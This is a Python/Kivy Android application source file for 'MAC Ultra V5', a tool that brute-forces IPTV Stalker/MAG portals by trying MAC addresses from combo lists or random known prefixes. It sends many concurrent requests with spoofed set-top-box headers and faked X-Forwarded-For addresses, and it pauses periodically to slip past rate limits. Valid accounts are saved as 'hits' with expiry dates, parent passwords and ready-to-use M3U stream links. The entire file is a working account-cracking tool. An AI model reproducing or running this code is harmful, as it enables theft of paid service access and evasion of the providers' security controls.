import os, asyncio, time, urllib.parse, httpx, random, ssl, json, socket, uuid
from datetime import datetime
from threading import Thread

from kivy.clock import Clock
from kivy.core.window import Window
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.spinner import Spinner
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.uix.slider import Slider
from kivy.uix.progressbar import ProgressBar
from kivy.uix.image import Image
from kivy.uix.modalview import ModalView
from kivy.graphics import Color, RoundedRectangle
from kivy.uix.screenmanager import Screen

# --- ANDROID NATIVE AUDIO ---
try:
    from jnius import autoclass
    MediaPlayer = autoclass('android.media.MediaPlayer')
    mPlayer = MediaPlayer()
    HAS_JNIUS = True
except:
    HAS_JNIUS = False

# --- KONFIGURATION ---
BG_DARK = (0.01, 0.02, 0.04, 1)
CARD_COLOR = (0.05, 0.07, 0.12, 1)
CYAN, GREEN, RED, YELLOW, WHITE = (0, 0.9, 1, 1), (0, 1, 0.5, 1), (1, 0.2, 0.2, 1), (1, 0.8, 0, 1), (1, 1, 1, 1)
MAC_VARIANTS = ('00:1A:79:', 'D4:CF:F9:', '33:44:CF:', '10:27:BE:', 'A0:BB:3E:')

GEO_DATA = {
    'DE': {'ip': ['85', '188', '93', '95'], 'tz': 'Europe/Berlin'},
    'IT': {'ip': ['151', '185', '79', '93'], 'tz': 'Europe/Rome'},
    'FR': {'ip': ['5', '80', '78', '176'], 'tz': 'Europe/Paris'}
}

class StyledCard(BoxLayout):
    def __init__(self, bg_color=CARD_COLOR, radius=[15,], **kwargs):
        super().__init__(**kwargs)
        with self.canvas.before:
            Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *a): self.rect.pos, self.rect.size = self.pos, self.size

class StyledButton(Button):
    def __init__(self, bg_color=CARD_COLOR, radius=[10,], **kwargs):
        super().__init__(**kwargs)
        self.background_normal, self.background_color = "", (0,0,0,0)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *a): self.rect.pos, self.rect.size = self.pos, self.size

# --- FAVORITEN SEITE ---
class PortalManagerView(ModalView):
    def __init__(self, main_screen, **kwargs):
        super().__init__(**kwargs)
        self.main_screen = main_screen
        self.size_hint = (0.95, 0.9)
        self.background_color = [0,0,0,0]
        self.fav_file = "/storage/emulated/0/Portals/favoriten_liste.json"
        
        layout = StyledCard(orientation="vertical", padding=20, spacing=15, bg_color=BG_DARK)
        layout.add_widget(Label(text="[color=00E6FF][b]MAC ULTRA FAVORITEN[/b][/color]", markup=True, size_hint_y=None, height=50))
        
        add_box = BoxLayout(size_hint_y=None, height=100, spacing=10, orientation="vertical")
        self.new_portal = TextInput(hint_text="http://url.com:8080", multiline=False, height=45)
        btn_row = BoxLayout(spacing=10)
        self.type_spin = Spinner(text="MAC PORTAL", values=("MAC PORTAL", "M3U PORTAL"))
        add_btn = StyledButton(text="HINZUFÜGEN", bg_color=(0, 0.4, 0.2, 1), on_press=self.add_portal)
        btn_row.add_widget(self.type_spin); btn_row.add_widget(add_btn)
        add_box.add_widget(self.new_portal); add_box.add_widget(btn_row)
        layout.add_widget(add_box)

        # Listen Überschriften (Punkt 2)
        header = BoxLayout(size_hint_y=None, height=35)
        header.add_widget(Label(text="[color=FFFF00][b]MAC LISTE[/b][/color]", markup=True))
        header.add_widget(Label(text="[color=00FFFF][b]M3U LISTE[/b][/color]", markup=True))
        layout.add_widget(header)

        lists_container = BoxLayout(spacing=10)
        self.mac_list = GridLayout(cols=1, spacing=5, size_hint_y=None); self.mac_list.bind(minimum_height=self.mac_list.setter('height'))
        self.m3u_list = GridLayout(cols=1, spacing=5, size_hint_y=None); self.m3u_list.bind(minimum_height=self.m3u_list.setter('height'))
        s1 = ScrollView(); s1.add_widget(self.mac_list); s2 = ScrollView(); s2.add_widget(self.m3u_list)
        lists_container.add_widget(s1); lists_container.add_widget(s2)
        layout.add_widget(lists_container)

        layout.add_widget(StyledButton(text="ZURÜCK ZUM SCANNER", size_hint_y=None, height=60, on_press=self.dismiss, color=RED))
        self.add_widget(layout); self.load_favs()

    def load_favs(self):
        self.mac_list.clear_widgets(); self.m3u_list.clear_widgets()
        if not os.path.exists(self.fav_file): return
        try:
            with open(self.fav_file, 'r') as f: data = json.load(f)
            for url in data.get("mac", []): self.add_row(self.mac_list, url, "mac")
            for url in data.get("m3u", []): self.add_row(self.m3u_list, url, "m3u")
        except: pass

    def add_row(self, target, url, ptype):
        row = BoxLayout(size_hint_y=None, height=45, spacing=5)
        row.add_widget(StyledButton(text=url[:25], font_size="10sp", on_press=lambda x: self.select(url)))
        del_btn = StyledButton(text="X", size_hint_x=0.2, color=RED, on_press=lambda x: self.delete(url, ptype))
        row.add_widget(del_btn); target.add_widget(row)

    def select(self, url): self.main_screen.portal_input.text = url; self.dismiss()
    def add_portal(self, *a):
        url = self.new_portal.text.strip()
        if not url: return
        ptype = "mac" if "MAC" in self.type_spin.text else "m3u"
        data = {"mac": [], "m3u": []}
        if os.path.exists(self.fav_file):
            with open(self.fav_file, 'r') as f: data = json.load(f)
        if url not in data[ptype]: data[ptype].append(url)
        with open(self.fav_file, 'w') as f: json.dump(data, f)
        self.load_favs()

    def delete(self, url, ptype):
        with open(self.fav_file, 'r') as f: data = json.load(f)
        if url in data[ptype]: data[ptype].remove(url)
        with open(self.fav_file, 'w') as f: json.dump(data, f)
        self.load_favs()

# --- MAIN SCREEN ---
class MagUltraScreen(Screen):
    def __init__(self, context, **kw):
        super().__init__(**kw)
        self.context = context
        self.hits, self.checked, self.running = 0, 0, False
        self.total_lines = 0 # Punkt 1
        self.request_count, self.error_streak = 0, 0
        self.hit_list, self.last_status, self.start_time = [], "READY", time.time()
        self.setup_ui()

    def setup_ui(self):
        self.box = BoxLayout(orientation="vertical", padding=20, spacing=10)
        self.box.add_widget(Image(source=self.context["paths"]["png"], size_hint_y=None, height=320))
        
        stats = GridLayout(cols=3, size_hint_y=None, height=100, spacing=10)
        self.cpm_label = self.create_stat(stats, "CPM", "0", YELLOW)
        self.status_code_label = self.create_stat(stats, "STATUS", "READY", CYAN)
        self.hit_count_label = self.create_stat(stats, "MAC ULTRA HITS", "0", GREEN)
        self.box.add_widget(stats)

        p_card = StyledCard(orientation="vertical", size_hint_y=None, height=160, padding=10, spacing=8)
        self.portal_input = TextInput(text="http://", multiline=False, height=45)
        row1 = BoxLayout(size_hint_y=None, height=45, spacing=10)
        self.portal_file_spinner = Spinner(text="USE SINGLE", values=self.load_list("/storage/emulated/0/Portals/"))
        self.country_filter = TextInput(text="DE", size_hint_x=0.2)
        row1.add_widget(self.portal_file_spinner); row1.add_widget(self.country_filter)
        p_card.add_widget(self.portal_input); p_card.add_widget(row1)
        self.box.add_widget(p_card)

        c_card = StyledCard(orientation="vertical", size_hint_y=None, height=260, padding=10, spacing=5)
        row_cfg = BoxLayout(size_hint_y=None, height=45, spacing=10)
        self.scan_mode = Spinner(text="COMBO FILE", values=("COMBO FILE", "RANDOM SCAN"))
        self.prefix_spinner = Spinner(text="PREFIX", values=MAC_VARIANTS)
        row_cfg.add_widget(self.scan_mode); row_cfg.add_widget(self.prefix_spinner)
        self.combo_spinner = Spinner(text="SELECT COMBO", values=self.load_list("/sdcard/Combo/"), height=45)
        
        # Delay Label & Slider (Punkt 4 & 5)
        self.delay_label = Label(text="DELAY: 1.0s", size_hint_y=None, height=20, color=YELLOW)
        self.delay_slider = Slider(min=0, max=5, value=1.0, step=0.1)
        self.delay_slider.bind(value=lambda i, v: setattr(self.delay_label, "text", f"DELAY: {v:.1f}s"))
        
        # Bot Label & Slider (Punkt 3 & 5)
        self.bot_label = Label(text="BOTS: 40", size_hint_y=None, height=20, color=CYAN)
        self.bot_slider = Slider(min=1, max=250, value=40, step=1)
        self.bot_slider.bind(value=lambda i, v: setattr(self.bot_label, "text", f"BOTS: {int(v)}"))

        c_card.add_widget(row_cfg); c_card.add_widget(self.combo_spinner)
        c_card.add_widget(self.delay_label); c_card.add_widget(self.delay_slider)
        c_card.add_widget(self.bot_label); c_card.add_widget(self.bot_slider)
        self.box.add_widget(c_card)

        px_card = StyledCard(size_hint_y=None, height=70, padding=10, spacing=10)
        self.proxy_spinner = Spinner(text="NO PROXY", values=("NO PROXY", "HTTP", "SOCKS5"))
        self.fav_btn = StyledButton(text="FAVORITEN", on_press=lambda x: PortalManagerView(self).open(), color=YELLOW)
        px_card.add_widget(self.proxy_spinner); px_card.add_widget(self.fav_btn)
        self.box.add_widget(px_card)

        self.progress_label = Label(text="PROGRESS: 0 / 0", size_hint_y=None, height=20, color=CYAN)
        self.pbar = ProgressBar(max=100, size_hint_y=None, height=10)
        self.log_scroll = ScrollView()
        self.log_label = Label(text="Ready...", markup=True, size_hint_y=None, halign='left')
        self.log_label.bind(size=self.log_label.setter('text_size'))
        self.log_scroll.add_widget(self.log_label)
        self.box.add_widget(self.progress_label); self.box.add_widget(self.pbar); self.box.add_widget(self.log_scroll)

        btn_box = BoxLayout(size_hint_y=None, height=80, spacing=10)
        self.start_btn = StyledButton(text="START MAC ULTRA", on_press=self.toggle, bg_color=(0, 0.4, 0.2, 1))
        self.music_btn = StyledButton(text="STOP MUSIC", size_hint_x=0.3, on_press=self.stop_audio, bg_color=(0.4, 0.1, 0.1, 1))
        btn_box.add_widget(self.start_btn); btn_box.add_widget(self.music_btn)
        self.box.add_widget(btn_box); self.add_widget(self.box)

    def create_stat(self, p, t, v, c):
        box = StyledCard(orientation="vertical")
        box.add_widget(Label(text=t, font_size="11sp"))
        lbl = Label(text=v, font_size="20sp", bold=True, color=c)
        box.add_widget(lbl); p.add_widget(box); return lbl

    # --- ENGINE ---
    def get_clean_time(self, raw):
        raw_str = str(raw).strip()
        if not raw_str or raw_str.lower() in ["none", "false", "0", "null"]: return "Unlimited", "Unlimited"
        try:
            if raw_str.isdigit() and len(raw_str) >= 9: dt = datetime.fromtimestamp(int(raw_str))
            else:
                for fmt in ("%Y-%m-%d", "%d.%m.%Y", "%B %d, %Y", "%m/%d/%Y"):
                    try: dt = datetime.strptime(raw_str, fmt); break
                    except: continue
            days = (dt - datetime.now()).days
            return dt.strftime('%d.%m.%Y'), f"{days} Tage"
        except: return "Unlimited", "Unlimited"

    async def smart_sleep(self):
        self.request_count += 1
        if self.request_count >= 50:
            self.update_log_safe("[color=FFFF00][SYSTEM][/color] Security Pause 15s...")
            await asyncio.sleep(15); self.request_count = 0
        await asyncio.sleep(self.delay_slider.value)

    def save_hit(self, portal, portal_ip, server_h, id_val, exp, days, pw, live, movies, series, sn, dev_id, l_list, m_list, s_list, tz_val, active_conn, max_conn, is_m3u=False, cre_date="N/A"):
        domain = portal.split('//')[-1].split(':')[0]
        final_dir = "/storage/emulated/0/Hits/MAC-ULTRA-V5/"
        os.makedirs(final_dir, exist_ok=True)
        m3u = f"{portal}/get.php?mac={id_val}&type=m3u_plus&output=ts" if not is_m3u else f"{portal}/get.php?username={id_val}&password={pw}&type=m3u_plus&output=ts"
        
        box = f"""━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🛰️ 𝗠𝗔𝗖 𝗨𝗟𝗧𝗥𝗔 𝗩𝟱 𝗛𝗜𝗧
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🔗 𝗣𝗼𝗿𝘁𝗮𝗹   : {portal}
  🌐 𝗜𝗣       : {portal_ip}
  🖥️ 𝗦𝗲𝗿𝘃𝗲𝗿   : {server_h}
  👤 {'𝗠𝟯𝗨 𝗨𝘀𝗲𝗿' if is_m3u else '𝗠𝗔𝗖'}    : {id_val}
  🔐 {'𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱' if is_m3u else '𝗔𝗱𝘂𝗹𝘁'} : {pw}
  📅 𝗖𝗿𝗲𝗮𝘁𝗲𝗱  : {cre_date}
  📅 𝗘𝘅𝗽𝗶𝗿𝘆   : {exp} (⌛ {days})
  🧱 𝗦𝗡        : {sn}
  📲 𝗗𝗲𝘃 𝗜𝗗   : {dev_id}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  📊 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗞𝗘𝗡:
  🎬 Filme    : {movies}
  🎞️ Serien   : {series}
  📡 Live TV  : {live}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🛸 𝗔𝗰𝘁𝗶𝘃𝗲     : {active_conn}
  🛸 𝗠𝗮𝘅 𝗖𝗼𝗻𝗻. : {max_conn}
  🛸 𝗭𝗼𝗻𝗲       : {tz_val}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🔗 𝗠𝟯𝗨 𝗟𝗜𝗡𝗞:
  {m3u}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🛰️ MAC ULTRA Scan: {time.strftime('%H:%M / %d.%m.%Y')}\n\n""" # Punkt 6

        # Optionale Listen (Punkt 7)
        if l_list: box += f" 📂 𝗟𝗜𝗩𝗘 𝗟𝗜𝗦𝗧\n ╚┈❲ {l_list} ❳\n\n"
        if m_list: box += f" 🎬 𝗠𝗢𝗩𝗜𝗘 𝗟𝗜𝗦𝗧\n ╚┈❲ {m_list} ❳\n\n"
        if s_list: box += f" 🎞️ 𝗦𝗘𝗥𝗜𝗘𝗦 𝗟𝗜𝗦𝗧\n ╚┈❲ {s_list} ❳\n\n"
        
        with open(os.path.join(final_dir, f"{domain}.txt"), "a", encoding="utf-8") as f: f.write(box)

    async def process_check(self, mac, portal, client):
        try:
            geo_i = GEO_DATA.get(self.country_filter.text.upper(), GEO_DATA['DE'])
            ip_fake = f"{random.choice(geo_i['ip'])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(2,254)}"
            dev_id = str(uuid.uuid4()).replace('-', '')[:32].upper()
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721',
                'X-STB-SN': f"MACULTRA{random.randint(1000,9999)}",
                'X-STB-Device-ID': dev_id,
                'X-Forwarded-For': ip_fake,
                'Cookie': f"mac={urllib.parse.quote(mac)}; stb_lang=en; timezone={urllib.parse.quote(geo_i['tz'])};",
                'JsHttpRequest': '1-xml'
            }

            r = await client.get(f"{portal}/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml", headers=headers)
            self.last_status = str(r.status_code)
            
            if r.status_code == 200 and 'token' in r.text:
                token = r.json().get('js', {}).get('token')
                headers['Authorization'] = f'Bearer {token}'
                ri = await client.get(f"{portal}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml", headers=headers)
                self.last_status = str(ri.status_code)
                
                if ri.status_code == 200:
                    js = ri.json().get('js', {})
                    exp, days = self.get_clean_time(js.get('end_date') or js.get('phone') or "Unlimited")
                    cre, _ = self.get_clean_time(js.get('reg_date'))
                    self.hits += 1
                    domain = portal.split('//')[-1].split(':')[0]
                    self.save_hit(portal, socket.gethostbyname(domain), headers['User-Agent'], mac, exp, days, 
                                 js.get('parent_password','0000'), js.get('channels_count','0'), js.get('movies_count','0'), 
                                 js.get('series_count','0'), js.get('sn','N/A'), js.get('device_id','N/A'), "", "", "", 
                                 js.get('timezone','UTC'), js.get('active_cons','0'), js.get('max_connections','1'), False, cre)
                    self.update_log_safe(f"[{domain}] [color=00FF80][HIT][/color] {mac} | {days}")
        except: self.error_streak += 1

    async def engine(self):
        portals = [self.portal_input.text.strip().rstrip('/')]
        if self.portal_file_spinner.text != "USE SINGLE":
            with open(f"/storage/emulated/0/Portals/{self.portal_file_spinner.text}", 'r') as f: portals = [l.strip().rstrip('/') for l in f if l.strip()]

        async with httpx.AsyncClient(verify=False, timeout=12) as client:
            for portal in portals:
                if not self.running: break
                try:
                    res = await client.get(f"http://ip-api.com/json/{portal.split('//')[-1].split(':')[0]}")
                    info = res.json(); srv_info = f"{info.get('isp','N/A')} ({info.get('country','N/A')})"
                except: srv_info = "N/A"
                
                self.update_log_safe(f"[color=00FFFF][INFO][/color] Server: {portal} | ISP: {srv_info}")
                
                if self.scan_mode.text == "COMBO FILE":
                    with open(f"/sdcard/Combo/{self.combo_spinner.text}", 'r', errors='ignore') as f: combo = [l.strip() for l in f if l.strip()]
                else:
                    pfx = self.prefix_spinner.text if ":" in self.prefix_spinner.text else "00:1A:79:"
                    combo = [f"{pfx}{':'.join([f'{random.randint(0,255):02x}' for _ in range(3)])}" for _ in range(1000)]

                self.total_lines, self.checked, self.start_time = len(combo), 0, time.time()
                Clock.schedule_once(lambda dt: setattr(self.pbar, 'max', self.total_lines))
                
                queue = asyncio.Queue()
                for l in combo: queue.put_nowait(l)
                workers = [self.worker(queue, portal, client) for _ in range(int(self.bot_slider.value))]
                await asyncio.gather(*workers)

        self.running = False; Clock.schedule_once(lambda dt: setattr(self.start_btn, 'text', "START MAC ULTRA"))

    async def worker(self, queue, portal, client):
        while self.running and not queue.empty():
            mac = await queue.get(); await self.process_check(mac, portal, client)
            self.checked += 1; await self.smart_sleep()
            Clock.schedule_once(lambda dt: self.refresh_ui()); queue.task_done()

    def toggle(self, *a):
        if not self.running:
            self.running, self.start_btn.text = True, "STOP SCAN"
            if HAS_JNIUS:
                try: mPlayer.reset(); mPlayer.setDataSource(self.context["paths"]["mp3"]); mPlayer.prepare(); mPlayer.start()
                except: pass
            Thread(target=lambda: asyncio.run(self.engine()), daemon=True).start()
        else: self.running = False

    def stop_audio(self, *a):
        if HAS_JNIUS:
            try: mPlayer.stop()
            except: pass

    def update_log_safe(self, t): Clock.schedule_once(lambda dt: self._do_log(t))
    def _do_log(self, t):
        self.hit_list.append(t)
        if len(self.hit_list) > 15: self.hit_list.pop(0)
        self.log_label.text = "\n".join(self.hit_list)

    def refresh_ui(self, *a):
        self.pbar.value, self.hit_count_label.text = self.checked, str(self.hits)
        self.status_code_label.text, self.progress_label.text = self.last_status, f"PROGRESS: {self.checked} / {self.total_lines}"
        el = time.time() - self.start_time
        if el > 0: self.cpm_label.text = str(int((self.checked / el) * 60))

    def load_list(self, path):
        if not os.path.exists(path): return ["EMPTY"]
        return sorted([f for f in os.listdir(path) if f.endswith(".txt")])

def create_app_screen(context):
    return MagUltraScreen(context=context, name="main")
